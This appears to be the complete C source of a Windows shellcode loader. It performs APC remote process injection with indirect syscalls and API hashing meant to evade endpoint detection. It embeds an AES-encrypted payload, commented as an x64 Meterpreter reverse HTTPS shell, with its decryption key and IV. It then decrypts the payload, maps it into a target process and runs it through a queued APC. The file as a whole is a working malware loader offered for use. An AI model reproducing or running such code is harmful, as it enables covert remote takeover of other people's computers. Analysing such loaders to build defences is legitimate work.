/*
*
* APC remote process injection with syscalls.
*
*/

#include <Windows.h>
#include <stdio.h>
#include "Common.h"

#include <bcrypt.h>

#pragma comment(lib, "Bcrypt.lib")

typedef struct _AES
{
	PBYTE pPlainText;               // base address of the plain text data
	DWORD dwPlainSize;              // size of the plain text data

	PBYTE pCipherText;              // base address of the encrypted data
	DWORD dwCipherSize;             // size of it (this can change from dwPlainSize in case there was padding)

	PBYTE pKey;                     // the 32 byte key
	PBYTE pIv;                      // the 16 byte iv
} AES, * PAES;

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes)
{
	BOOL bSTATE = TRUE;

	BCRYPT_ALG_HANDLE hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE hKeyHandle = NULL;

	ULONG cbResult = NULL;
	DWORD dwBlockSize = NULL;

	DWORD cbKeyObject = NULL;
	PBYTE pbKeyObject = NULL;

	PBYTE pbPlainText = NULL;
	DWORD cbPlainText = NULL;

	NTSTATUS STATUS = NULL;

	// intializing "hAlgorithm" as AES algorithm Handle
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// checking if block size is 16
	if (16 != dwBlockSize)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// allocating memory for the key object
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);

	if (NULL == pbKeyObject)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// allocating enough memory (of size cbPlainText)
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);

	if (NULL == pbPlainText)
	{
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// running BCryptDecrypt second time with "pbPlainText" as output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);

	if (!NT_SUCCESS(STATUS))
	{
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// cleaning up
_EndOfFunc:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	if (NULL != pbPlainText && bSTATE)
	{
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}

	return bSTATE;
}

// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize)
{
	if (NULL == pCipherTextData || NULL == sCipherTextSize || NULL == pKey || NULL == pIv)
		return FALSE;

	AES Aes = {
			.pKey = pKey,
			.pIv = pIv,
			.pCipherText = pCipherTextData,
			.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes))
		return FALSE;

	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}

// x64 meterpreter reverse https
unsigned char payload[] = {
		0x2D, 0xD7, 0xDD, 0x88, 0x24, 0xD7, 0xA3, 0xD9, 0x87, 0x4F, 0x94, 0xA8, 0xCA, 0xB0, 0xAF, 0xD9,
		0x3F, 0xAC, 0xA8, 0xC9, 0x5E, 0x38, 0xB2, 0xF6, 0xB0, 0x55, 0x9A, 0xAF, 0x58, 0xCC, 0x9E, 0x15,
		0x10, 0xE0, 0x6C, 0x70, 0x33, 0x87, 0x20, 0x9B, 0x03, 0x8B, 0x58, 0xF4, 0x9E, 0x61, 0x52, 0x0B,
		0x2E, 0x02, 0x98, 0x01, 0x14, 0x81, 0xCD, 0xA8, 0xE0, 0x90, 0x1F, 0xFE, 0x5B, 0x5C, 0x48, 0x26,
		0xAB, 0x9D, 0xB6, 0xCC, 0xAF, 0x9F, 0xED, 0x90, 0x59, 0xA3, 0x85, 0x41, 0xDE, 0x23, 0x30, 0xE5,
		0x82, 0xE7, 0x18, 0x96, 0xAB, 0xB3, 0x5A, 0xA0, 0x2C, 0x1E, 0xF3, 0x98, 0x64, 0xC5, 0x6B, 0xCF,
		0xD6, 0xDE, 0xDC, 0x59, 0x8F, 0x02, 0x15, 0x82, 0x8A, 0xA0, 0x81, 0x15, 0xBA, 0xB2, 0x47, 0x53,
		0xFF, 0xB5, 0xEC, 0xF1, 0x46, 0xCF, 0x1D, 0x9D, 0xF6, 0x1D, 0xF6, 0x1A, 0xB5, 0x3F, 0xC9, 0xC0,
		0x63, 0x7C, 0x4B, 0x5B, 0xA4, 0x68, 0xE3, 0xEA, 0x89, 0xB2, 0x7B, 0x99, 0x76, 0xB4, 0x7B, 0xDB,
		0xED, 0x43, 0x30, 0x09, 0xB9, 0x4C, 0x9E, 0x94, 0xC1, 0x93, 0x42, 0xE4, 0x5F, 0xFB, 0x95, 0xC7,
		0x47, 0xE9, 0xC2, 0x1C, 0xAB, 0x1D, 0x11, 0x20, 0x31, 0x07, 0x0B, 0x65, 0xC9, 0xB8, 0xC5, 0x96,
		0x07, 0x32, 0x70, 0xCD, 0x33, 0x3B, 0xB8, 0x4C, 0x94, 0x98, 0xC5, 0x47, 0x82, 0xE1, 0x3B, 0xBD,
		0xD2, 0xD6, 0x67, 0x91, 0x45, 0x9F, 0x5E, 0x75, 0xF8, 0xAF, 0x79, 0x2A, 0x1A, 0x42, 0xF8, 0x81,
		0xAE, 0xC4, 0x42, 0x86, 0xAB, 0x14, 0x92, 0xBD, 0x04, 0xB4, 0x20, 0x1F, 0xB3, 0xFF, 0xF1, 0xC5,
		0x07, 0x08, 0x67, 0xC6, 0xE0, 0x2A, 0xD6, 0x2E, 0x6F, 0x84, 0xAC, 0x20, 0xC1, 0x61, 0xA3, 0xB9,
		0x09, 0x86, 0x34, 0x1F, 0x3D, 0x0E, 0xB4, 0x52, 0xD4, 0x75, 0x16, 0x26, 0x24, 0xA8, 0xB0, 0x2D,
		0x52, 0xC3, 0xAC, 0x9F, 0xC7, 0xDA, 0xE6, 0x92, 0xFB, 0xF9, 0xE1, 0xA6, 0x65, 0xE1, 0x83, 0xE2,
		0xAF, 0x24, 0x11, 0xF5, 0xA3, 0x3F, 0xBA, 0xE1, 0x3D, 0xDA, 0x98, 0xBE, 0x1C, 0x9B, 0x58, 0x77,
		0x35, 0x1A, 0xBA, 0x1A, 0x1B, 0x57, 0x66, 0x53, 0x42, 0x93, 0x9C, 0x48, 0xA6, 0x9D, 0x76, 0x2D,
		0x60, 0x53, 0x72, 0x7D, 0x68, 0xAD, 0x3C, 0xA0, 0xCC, 0x2D, 0x2A, 0x80, 0x98, 0xB9, 0xB5, 0x42,
		0xC8, 0x8E, 0x98, 0x85, 0xCC, 0x41, 0xC2, 0xB1, 0xF6, 0xAD, 0x03, 0xB0, 0x76, 0xC1, 0x18, 0x74,
		0x7B, 0x36, 0x8A, 0xD2, 0xDF, 0xDE, 0x2B, 0xE4, 0x1F, 0xDB, 0x37, 0x88, 0xCB, 0x56, 0x84, 0xCF,
		0xAA, 0x3F, 0x43, 0x4B, 0xDF, 0x93, 0x3C, 0xDA, 0x97, 0x5F, 0x2F, 0xE1, 0x0D, 0x43, 0x67, 0x76,
		0x54, 0xCF, 0x27, 0x23, 0xD0, 0x11, 0x3F, 0xCD, 0xA0, 0xDB, 0x2F, 0xD4, 0xC6, 0x1B, 0xD5, 0xC3,
		0x93, 0x5D, 0x47, 0x90, 0xC3, 0x8B, 0x96, 0x5D, 0xEC, 0x35, 0x12, 0x4F, 0xA8, 0x45, 0xD6, 0x6B,
		0x26, 0x41, 0x17, 0x23, 0x0C, 0x98, 0x4A, 0x66, 0x38, 0x76, 0x91, 0xD3, 0xA9, 0xBA, 0xBA, 0x3B,
		0x79, 0x06, 0x74, 0xAD, 0xAF, 0xAE, 0x65, 0x10, 0xB5, 0xAB, 0x25, 0x7F, 0x14, 0x73, 0x28, 0xC0,
		0x71, 0x8C, 0xCA, 0xC3, 0x5A, 0xF9, 0xFC, 0x0F, 0x36, 0x12, 0x26, 0xBC, 0x24, 0xDB, 0x4B, 0x7C,
		0x87, 0x9D, 0xE8, 0x60, 0xE6, 0x35, 0x22, 0x73, 0x60, 0x6A, 0xC6, 0xFF, 0x27, 0xCA, 0x36, 0x96,
		0x95, 0xC3, 0xEB, 0x8B, 0x40, 0x5E, 0xD5, 0x71, 0xCD, 0xEE, 0x7E, 0x66, 0x4A, 0xF6, 0x04, 0x4E,
		0x93, 0x76, 0x56, 0xB5, 0x92, 0xD4, 0xE2, 0x06, 0x80, 0x0D, 0x0B, 0xFD, 0xF8, 0xA9, 0xB8, 0x5D,
		0x96, 0x73, 0x77, 0xD9, 0xEC, 0x7A, 0x3E, 0xCA, 0xFA, 0x3B, 0x91, 0x7A, 0xAA, 0xCC, 0xD5, 0x42,
		0x21, 0xE6, 0xE9, 0x8A, 0x38, 0x46, 0x38, 0xAC, 0xAD, 0x7F, 0xB2, 0x1B, 0xE3, 0x78, 0x6E, 0x41,
		0xB5, 0xB5, 0x15, 0xF6, 0xA7, 0x5D, 0x5D, 0x64, 0x83, 0xE8, 0x5A, 0xA5, 0x02, 0x58, 0x13, 0x47,
		0xE3, 0x39, 0xDE, 0x59, 0xCD, 0xE6, 0x20, 0xD9, 0x4B, 0x34, 0x72, 0x89, 0x5D, 0xC2, 0xF3, 0x7B,
		0x97, 0x30, 0x57, 0x57, 0xBB, 0x05, 0x53, 0x72, 0xBD, 0xDB, 0x69, 0x8A, 0xA1, 0xBA, 0xB9, 0xCC,
		0x1F, 0x70, 0x1E, 0xA0, 0x72, 0x00, 0x1A, 0x5D, 0x24, 0x3F, 0xEF, 0x81, 0x3E, 0x93, 0xEF, 0x9E,
		0xA7, 0x3E, 0x4A, 0xC1, 0xE4, 0x4B, 0x4C, 0xD7, 0x31, 0x5C, 0x79, 0xD3, 0xD8, 0x1C, 0xA8, 0xB2,
		0x25, 0x86, 0xD6, 0x44, 0xD4, 0xDB, 0xD7, 0x01, 0xBA, 0x71, 0xD2, 0xFD, 0x2B, 0x0A, 0x54, 0x0A,
		0x4F, 0x92, 0xEE, 0xE7, 0x72, 0xE4, 0xA5, 0x43, 0x35, 0x4A, 0xF7, 0x7E, 0x68, 0x1B, 0x00, 0x11,
		0xB6, 0x49, 0xDA, 0xDE, 0x3A, 0x07, 0x52, 0x92, 0x0E, 0x97, 0x19, 0x59, 0xB0, 0x4D, 0xF2, 0x2B,
		0xD2, 0x16, 0x5F, 0xBC, 0x1A, 0x5C, 0xA5, 0xFF, 0x70, 0x5D, 0xFA, 0xED, 0xAE, 0x31, 0xC0, 0x66,
		0x6F, 0x5D, 0xC8, 0xF3, 0xBA, 0x39, 0x50, 0xB3, 0xFE, 0xBF, 0x83, 0xBC, 0x25, 0x50, 0xA7, 0x6E };

unsigned char AesKey[] = {
		0x89, 0xA0, 0x66, 0x5F, 0x48, 0x01, 0xA8, 0xAD, 0x5E, 0x00, 0x2D, 0xDF, 0xCE, 0xE0, 0x3A, 0xEF,
		0x37, 0x16, 0x83, 0x94, 0x07, 0xAB, 0xFB, 0xC4, 0xEB, 0xE2, 0xEB, 0x77, 0x8A, 0x1B, 0x41, 0xAF };

unsigned char AesIv[] = {
		0x35, 0x18, 0xE1, 0x5D, 0xD0, 0x71, 0x8D, 0x6F, 0x98, 0x5D, 0x44, 0x1C, 0x5C, 0xF9, 0xFB, 0x97 };

SYSCALL_TAB g_SyscallTab = { 0 };
BENIGN_SYSCALL_TAB g_Benign_Syscall_tab = { 0 };

BOOL InitializeNtSyscalls()
{
	// resolve benign syscalls
	if (!ResolveNtSyscall(NtCreateFile_CRC32, &g_Benign_Syscall_tab.NtCreateFile))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateFile \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_Benign_Syscall_tab.NtCreateFile.dwSSn, g_Benign_Syscall_tab.NtCreateFile.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtOpenFile_CRC32, &g_Benign_Syscall_tab.NtOpenFile))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtOpenFile \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_Benign_Syscall_tab.NtOpenFile.dwSSn, g_Benign_Syscall_tab.NtOpenFile.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtWriteFile_CRC32, &g_Benign_Syscall_tab.NtWriteFile))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteFile \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtWriteFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_Benign_Syscall_tab.NtWriteFile.dwSSn, g_Benign_Syscall_tab.NtWriteFile.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtLockFile_CRC32, &g_Benign_Syscall_tab.NtLockFile))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtLockFile \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtLockFile Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_Benign_Syscall_tab.NtLockFile.dwSSn, g_Benign_Syscall_tab.NtLockFile.pSyscallAddress);
#endif

	// resolve syscalls
	if (!ResolveNtSyscall(NtOpenProcess_CRC32, &g_SyscallTab.NtOpenProcess))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtOpenProcess \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtOpenProcess.dwSSn, g_SyscallTab.NtOpenProcess.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtQueryInformationProcess_CRC32, &g_SyscallTab.NtQueryInformationProcess))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtQueryInformationProcess \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtQueryInformationProcess.dwSSn, g_SyscallTab.NtQueryInformationProcess.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtCreateSection_CRC32, &g_SyscallTab.NtCreateSection))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtCreateSection.dwSSn, g_SyscallTab.NtCreateSection.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtMapViewOfSection_CRC32, &g_SyscallTab.NtMapViewOfSection))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtMapViewOfSection.dwSSn, g_SyscallTab.NtMapViewOfSection.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtUnmapViewOfSection_CRC32, &g_SyscallTab.NtUnmapViewOfSection))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtUnmapViewOfSection.dwSSn, g_SyscallTab.NtUnmapViewOfSection.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtCreateThreadEx_CRC32, &g_SyscallTab.NtCreateThreadEx))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtCreateThreadEx.dwSSn, g_SyscallTab.NtCreateThreadEx.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtQueueApcThread_CRC32, &g_SyscallTab.NtQueueApcThread))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtQueueApcThread \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtQueueApcThread.dwSSn, g_SyscallTab.NtQueueApcThread.pSyscallAddress);
#endif

	if (!ResolveNtSyscall(NtAlertResumeThread_CRC32, &g_SyscallTab.NtAlertResumeThread))
	{
		printf("[!] Failed In Obtaining The Syscall Number Of NtAlertResumeThread \n");
		return FALSE;
	}
#ifdef _DBG
	printf("[+] Syscall Number Of NtOpenProcess Is : 0x%0.2X \n\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
		g_SyscallTab.NtAlertResumeThread.dwSSn, g_SyscallTab.NtAlertResumeThread.pSyscallAddress);
#endif

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("[-]Usage: %s <process id> ...\n", argv[0]);
		return -1;
	}

	PDWORD64 dwPid = (PDWORD64)atoi(argv[1]);
	NTSTATUS status = 0x0;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES oa = { 0 };
	SecureZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));
	// or memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
	CLIENT_ID cid = { 0 };
	cid.UniqueProcess = dwPid;
	DWORD64 isWoW64 = 0x0;
	ULONG retLen = 0x0;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	LARGE_INTEGER maxSize = {
		.LowPart = sizeof(payload),
		.HighPart = 0
	};
	PVOID lpLocalMap = NULL;
	SIZE_T sViewSize = 0x0;
	PVOID lpRemoteMap = NULL;
	HANDLE hRemoteThread = NULL;

	// initializing the used syscalls
	if (!InitializeNtSyscalls())
	{
		printf("[!] Failed To Initialize The Specified Direct-Syscalls \n");
		return -1;
	}

	// open target process
	SET_SYSCALL(g_SyscallTab.NtOpenProcess, g_Benign_Syscall_tab.NtCreateFile);
	if ((status = ExecSyscall(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtOpenProcess Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Target process: 0x%p\n", hProcess);
#endif

	SET_SYSCALL(g_SyscallTab.NtQueryInformationProcess, g_SyscallTab.NtQueryInformationProcess);
	if ((status = ExecSyscall(hProcess, ProcessWow64Information, &isWoW64, sizeof(DWORD64), &retLen)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}
	printf("[*]Process architecture is: %s\n", isWoW64 == 1 ? "32bit" : "64bit");

#ifdef _DBG
	printf("[i]Press Enter to call NtCreateSection ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtCreateSection, g_Benign_Syscall_tab.NtWriteFile);
	if ((status = ExecSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Local section created at: 0x%p\n", hSection);
	printf("[i]Press Enter to call NtMapViewOfSection ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtOpenFile);
	if ((status = ExecSyscall(hSection, (HANDLE)-1, &lpLocalMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_READWRITE)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Local view mapped at: 0x%p\n", lpLocalMap);
	printf("[i]Press Enter to decrypt payload and call memcpy ...\n");
	getchar();
#endif

	PVOID pPlaintext = NULL;
	DWORD dwPlainSize = NULL;

	// decryption
	if (!SimpleDecryption(payload, sizeof(payload), AesKey, AesIv, &pPlaintext, &dwPlainSize))
		return -1;

	memcpy(lpLocalMap, pPlaintext, dwPlainSize);

#ifdef _DBG
	printf("[i]Press Enter to call NtMapViewOfSection ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtMapViewOfSection, g_Benign_Syscall_tab.NtLockFile);
	if ((status = ExecSyscall(hSection, hProcess, &lpRemoteMap, NULL, NULL, NULL, &sViewSize, 0x1, NULL, PAGE_EXECUTE_READ)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
	printf("[i]Press Enter to call NtUnmapViewOfSection ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_Benign_Syscall_tab.NtCreateFile);
	if ((status = ExecSyscall((HANDLE)-1, lpLocalMap)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Remote view mapped at: 0x%p\n", lpRemoteMap);
	printf("[i]Press Enter to load ntdll.dll ...\n");
	getchar();
#endif

	PVOID RtlExitUserThread = (PVOID)GetProcAddressH(GetModuleHandleH(ntdll_CRC32), RtlExitUserThread_CRC32);

#ifdef _DBG
	printf("[i]Press Enter to call NtCreateThreadEx ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtCreateThreadEx, g_Benign_Syscall_tab.NtOpenFile);
	if ((status = ExecSyscall(&hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)RtlExitUserThread, NULL, TRUE, NULL, NULL, NULL, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Remote thread create at: 0x%p\n", hRemoteThread);
	printf("[i]Press Enter to call NtQueueApcThread ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtQueueApcThread, g_Benign_Syscall_tab.NtWriteFile);
	if ((status = ExecSyscall(hRemoteThread, (PIO_APC_ROUTINE)lpRemoteMap, NULL, NULL, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

#ifdef _DBG
	printf("[*]Remote thread create at: 0x%p\n", hRemoteThread);
	printf("[i]Press Enter to call NtAlertResumeThread ...\n");
	getchar();
#endif

	SET_SYSCALL(g_SyscallTab.NtAlertResumeThread, g_Benign_Syscall_tab.NtCreateFile);
	if ((status = ExecSyscall(hRemoteThread, NULL)))
	{
		SET_LAST_NT_ERROR(status);
		printf("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
		return -1;
	}

	// better to do some more cleanup here...

	// freeing
	HeapFree(GetProcessHeap(), 0, pPlaintext);

	return 0;
}

